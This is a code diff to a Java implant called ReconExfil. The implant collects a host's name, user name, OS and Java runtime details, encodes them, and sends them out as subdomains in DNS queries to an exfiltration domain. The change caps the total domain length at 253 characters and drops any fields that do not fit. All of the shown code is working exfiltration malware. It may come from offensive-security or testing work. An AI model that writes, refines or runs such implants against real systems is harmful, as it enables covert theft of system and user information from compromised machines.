@@ -4,9 +4,7 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
-import java.util.Map;
-import java.util.Properties;
-import java.util.Random;
+import java.util.*;
 
 public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
@@ -29,6 +27,15 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
      * loss).
      */
     static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;
+
+    /**
+     * Maximum length of the whole domain name.
+     * DNS specifies a maximum total length of a domain name (all subdomains) of 255. However, there need to be space
+     * for the length octet and a 0, so the actual max length of a domain name is 253.
+     * A custom value may be set if there are concerns that upstream DNS servers may dislike large requests.
+     * Note: This simple implant will just exclude any encoded data fields that does not fit.
+     */
+    static volatile int CONF_DOMAIN_MAX_LEN = 253;
 
     @SuppressWarnings("unused")
     public static void init() {
@@ -90,13 +97,22 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         String runtimeInfo = getRuntimeInfo(javaProps);
         String uniqueId = getUniqueId();
 
-        String encHostname = encode(hostname);
-        String encUsername = encode(username);
-        String encOsInfo = encode(osInfo);
-        String encRuntimeInfo = encode(runtimeInfo);
+        List<String> encodedParts = new LinkedList<>();
+        encodedParts.add(encode(hostname));
+        encodedParts.add(encode(username));
+        encodedParts.add(encode(osInfo));
+        encodedParts.add(encode(runtimeInfo));
 
-        return encHostname + "." + encUsername + "." + encOsInfo + "." + encRuntimeInfo + "."
-                + uniqueId + "." + CONF_EXFIL_DNS;
+        String lastPart = uniqueId + "." + CONF_EXFIL_DNS;
+        StringBuilder domainName = new StringBuilder();
+        for (String encodedPart : encodedParts) {
+            if (encodedPart.length() + 1 + domainName.length() + lastPart.length() <= CONF_DOMAIN_MAX_LEN) {
+                domainName.append(encodedPart).append(".");
+            }
+        }
+        domainName.append(lastPart);
+
+        return domainName.toString();
     }
 
     // Just hex represent it for now. This is very space inefficient, but at least it's compatible with DNS.
